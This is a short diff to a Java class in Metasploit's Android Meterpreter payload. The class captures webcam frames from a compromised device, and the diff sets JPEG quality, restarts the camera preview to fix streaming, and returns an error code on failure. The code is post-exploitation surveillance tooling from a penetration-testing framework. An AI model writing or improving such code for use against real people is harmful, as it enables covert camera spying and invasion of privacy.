@@ -12,6 +12,8 @@ import com.metasploit.meterpreter.TLVPacket;
 import com.metasploit.meterpreter.command.Command;
 import com.metasploit.meterpreter.stdapi.webcam_audio_record;
 
+import java.lang.Exception;
+
 public class webcam_get_frame_android extends webcam_audio_record implements Command {
 
     private static final int TLV_EXTENSIONS = 20000;
@@ -30,13 +32,21 @@ public class webcam_get_frame_android extends webcam_audio_record implements Com
             }
 
             cameraData = null;
-            //Parameters params = webcam_start_android.camera.getParameters();
-            //params.setPictureFormat(PixelFormat.JPEG);
-            //params.set("jpeg-quality", quality);
+            Parameters params = webcam_start_android.camera.getParameters();
+            params.set("jpeg-quality", quality);
+            webcam_start_android.camera.setParameters(params);
+
             webcam_start_android.camera.takePicture(null, null, new PictureCallback() {
                 @Override
                 public void onPictureTaken(byte[] data, Camera camera) {
                     cameraData = data;
+
+                    // Fix webcam_stream
+                    try {
+                        camera.startPreview();
+                    } catch (Exception e) {
+                    }
+
                     synchronized (webcam_get_frame_android.this) {
                     	webcam_get_frame_android.this.notify();
                     }
@@ -52,6 +62,7 @@ public class webcam_get_frame_android extends webcam_audio_record implements Com
             }
         } catch (Exception e) {
             Log.e(getClass().getSimpleName(), "webcam error ", e);
+            return ERROR_FAILURE;
         }
 
         return ERROR_SUCCESS;
